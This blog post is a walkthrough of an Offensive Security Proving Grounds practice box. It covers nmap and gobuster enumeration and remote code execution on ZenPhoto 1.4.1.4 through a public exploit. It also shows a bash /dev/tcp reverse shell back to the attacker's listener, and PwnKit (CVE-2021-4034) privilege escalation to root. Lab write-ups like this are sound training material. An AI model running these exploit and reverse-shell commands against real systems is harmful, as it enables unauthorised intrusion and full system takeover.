---
layout: post
author: H4
---

This is an Offensive Security proving grounds practice box.

# enumeration

Executing a `nmap` scan to identify the attack surface of the target.

## port scan
```bash
$ nmap -Pn -p- -sV 192.168.126.41
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-13 07:12 EST
Nmap scan report for 192.168.126.41
Host is up (0.044s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 5.3p1 Debian 3ubuntu7 (Ubuntu Linux; protocol 2.0)
23/tcp   open  ipp     CUPS 1.4
80/tcp   open  http    Apache httpd 2.2.14 ((Ubuntu))
3306/tcp open  mysql?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.70 seconds
```

## port 22 (`ssh`)
> No weak credentials identified, `root` login is disabled or only private key authentication is enabled.
{: .prompt-danger }

## port 23 (CUPS)
version: `cups 1.4`

## port 80 (web server)

Checking with `gobuster` for hidden resources.
```bash
$ gobuster dir -u http://192.168.126.41/ -w /usr/share/wordlists/dirb/common.txt -t 5 -x php,txt,html -b 404,403                                                        130 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.126.41/
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
2022/02/13 07:19:38 Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 75]
/index.html           (Status: 200) [Size: 75]
/index.html           (Status: 200) [Size: 75]
Progress: 15560 / 18460 (84.29%)             [ERROR] 2022/02/13 07:21:25 [!] Get "http://192.168.126.41/server-status": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/test                 (Status: 301) [Size: 315] [--> http://192.168.126.41/test/]
                                                                                 
===============================================================
2022/02/13 07:21:46 Finished
===============================================================
```
The resource `/test` looks interesting.  

> Inside `/test` there is the application `zenphoto 1.4.1.4` hosted (version number is leaked via `html` source).
{: .prompt-info }

---

# exploitation
## find exploit
```bash
$ searchsploit 1.4.1.4
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                |  Path
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
ZenPhoto 1.4.1.4 - 'ajax_create_folder.php' Remote Code Execution                                                                             | php/webapps/18083.php
---------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

## exploit `zenphoto 1.4.1.4`
```bash
$ php -f 18083.php 192.168.126.41 /test/

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# whoami
www-data

```

> And we got a shell!
{: .prompt-info }

---

# post exploitation
## get reverse shell
### start listener on attacker machine
```bash
$ nc -lvp 80                                                  
listening on [any] 80 ...
```

### trigger reverse shell
```bash
$ php -f 18083.php 192.168.126.41 /test/

+-----------------------------------------------------------+
| Zenphoto <= 1.4.1.4 Remote Code Execution Exploit by EgiX |
+-----------------------------------------------------------+

zenphoto-shell# whoami
www-data

zenphoto-shell# bash -c 'bash -i >& /dev/tcp/192.168.49.126/80 0>&1'
```

### catch connect from target
```bash
$ nc -lvp 80                                                  
listening on [any] 80 ...
192.168.126.41: inverse host lookup failed: Unknown host
connect to [192.168.49.126] from (UNKNOWN) [192.168.126.41] 55306
bash: no job control in this shell
<p-extensions/tiny_mce/plugins/ajaxfilemanager/inc$ whoami
whoami
www-data
```

## get first flag
```bash
<re/zp-extensions/tiny_mce/plugins/ajaxfilemanager$ cd /home
cd /home
www-data@offsecsrv:/home$ ls
ls
local.txt
www-data@offsecsrv:/home$ cat local.txt
cat local.txt
5******************************e
```

## privilege escalation
> Vulnerable to the `sudo` `LPE` ([exploit](https://github.com/berdav/CVE-2021-4034))
{: .prompt-info }

1. `git clone` exploit code to attacker machine
2. `zip` files
3. upload `zip` file to target machine via own web server (e.g. `python3` web server module) and `wget` on the target
4. execute `make` on the target

```bash
www-data@offsecsrv:/tmp$ make
make
cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c
cc -Wall    cve-2021-4034.c   -o cve-2021-4034
echo "module UTF-8// PWNKIT// pwnkit 1" > gconv-modules
mkdir -p GCONV_PATH=.
cp -f /bin/true GCONV_PATH=./pwnkit.so:.
www-data@offsecsrv:/tmp$ ls
ls
GCONV_PATH=.  README.md      cve-2021-4034.c   gconv-modules  pwnkit.so
LICENSE       a.zip          cve-2021-4034.sh  linpeas.sh     vmware-root
Makefile      cve-2021-4034  dry-run           pwnkit.c
```

Execute compiled `LPE` exploit
```bash
www-data@offsecsrv:/tmp$ ./cve-2021-4034
./cve-2021-4034
# whoami
whoami
root
```

> Root!
{: .prompt-info }

## get second flag
```bash
cd /root
# ls
ls
mysqlpass  proof.txt
# cat proof.txt
cat proof.txt
a******************************2
```

Pwned! <@:-)
